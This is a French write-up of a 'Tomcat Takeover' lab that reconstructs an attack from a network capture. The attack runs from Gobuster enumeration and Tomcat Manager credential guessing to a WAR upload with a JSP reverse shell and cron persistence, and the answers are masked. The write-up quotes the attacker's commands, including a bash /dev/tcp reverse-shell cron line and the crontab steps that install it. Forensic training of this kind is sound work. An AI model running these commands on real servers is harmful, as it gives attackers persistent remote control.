# Write-up FR — Tomcat Takeover Lab

Statut : terminé

## 1. Contexte

Ce write-up documente l’analyse d’un fichier PCAP lié à une compromission Apache Tomcat.

L’objectif est de reconstruire la chaîne d’attaque depuis les traces réseau :

1. identification de l’attaquant
2. découverte du service exposé
3. énumération des répertoires
4. accès au panneau d’administration
5. identification des identifiants valides
6. upload d’un fichier WAR
7. exécution d’un reverse shell
8. installation d’une persistance.

## 2. Identification de l’attaquant

L’analyse des requêtes HTTP montre deux clients principaux :

- `**********`, qui semble correspondre à une activité de navigation normale ;
- `**********`, qui effectue une activité beaucoup plus suspecte.

L’adresse `**********` est responsable de l’énumération, des tentatives d’accès au manager Tomcat, de l’upload WAR, puis de la connexion reverse shell.

Réponse Q1 :

```text
********
```

## 3. Service exposé

Les requêtes HTTP ciblent le serveur `**********` sur le port `****`.

Ce port correspond au service web Tomcat exposé.

Réponse Q3 :

```text
********
```

## 4. Énumération web

Le User-Agent suivant apparaît dans les requêtes HTTP :

```text
************
```

Cela indique que l’attaquant a utilisé Gobuster pour découvrir des répertoires et fichiers web.

Exemples de chemins testés :

```text
/admin
/admin-console
/host-manager
/*******
/*******/html
/*******/list
/status
/webdav
```

Réponse Q4 :

```text
********
```

## 5. Découverte du panneau d’administration

Les nombreuses requêtes vers `/*******`, `/*******/html` et d’autres chemins liés au Tomcat Manager montrent que l’attaquant cherche à accéder à l’interface d’administration.

Le répertoire principal découvert est :

```text
/*******
```

Réponse Q5 :

```text
********
```

## 6. Brute-force ou test d’identifiants

L’analyse des en-têtes HTTP Basic Auth montre plusieurs couples testés :

```text
*****:*****
******:******
admin:
*****:******
******:******
*****:******
```

La combinaison qui permet ensuite d’accéder au manager et d’uploader le WAR est :

```text
*****:******
```

Réponse Q6 :

```text
********
```

## 7. Upload du fichier WAR

L’attaquant envoie une requête POST vers :

```text
/*******/html/upload
```

Le contenu multipart révèle le nom du fichier uploadé :

```text
filename="******.***"
```

Réponse Q7 :

```text
********
```

## 8. Extraction et analyse du WAR

Le WAR extrait contient les fichiers suivants :

```text
WEB-INF/
WEB-INF/web.xml
********.***
```

Le fichier `web.xml` indique que la JSP est utilisée comme fichier d’accueil :

```xml
<welcome-file>********.***</welcome-file>
```

La JSP contient du code Java permettant d’exécuter un shell système :

```java
Process process = Runtime.getRuntime().exec(ShellPath);
```

Elle établit aussi une connexion réseau sortante vers :

```text
10.0.0.142:80
```

Cependant, dans la capture réseau, la connexion observée après déclenchement part vers :

```text
**********:80
```

## 9. Déclenchement de la webshell

Après l’upload, l’attaquant accède à :

```text
/******/
```

Cela déclenche l’exécution de la JSP malveillante contenue dans le WAR.

## 10. Reverse shell

Le flux TCP `****` montre une connexion interactive entre :

```text
**********:***** -> **********:80
```

Le suivi ASCII du flux révèle les commandes exécutées :

```bash
whoami
cd /tmp
pwd
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'" > cron
crontab -i cron
crontab -l
```

La commande `whoami` retourne :

```text
****
```

## 11. Persistance

L’attaquant installe une tâche cron exécutée toutes les minutes :

```cron
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'
```

Cette persistance relance un reverse shell vers `**********` sur le port `***`.

Réponse Q8 :

```text
********
```

## 12. Timeline synthétique

| Temps relatif | Événement |
|---:|---|
| `386s` | Énumération Gobuster massive |
| `409s` | Accès à `/*******/html` |
| `418s - 437s` | Tentatives Basic Auth |
| `437s` | Authentification réussie avec `*****:******` |
| `547s` | Upload de `******.***` |
| `556s` | Accès à `/******/` |
| `563s+` | Reverse shell actif |
| `669s` | Installation de la persistance cron |

## 13. IOCs

```text
**********
**********
****
80
443
/*******
/*******/html
/*******/html/upload
/******/
******.***
********.***
************
*****:******
tcp.stream == ****
```

## 14. Conclusion

L’analyse confirme une compromission complète du serveur Tomcat.

L’attaquant `**********` a découvert le panneau `/*******`, validé les identifiants `*****:******`, uploadé le fichier `******.***`, déclenché la JSP `********.***`, obtenu un reverse shell avec privilèges `****`, puis installé une persistance cron vers `**********:443`.
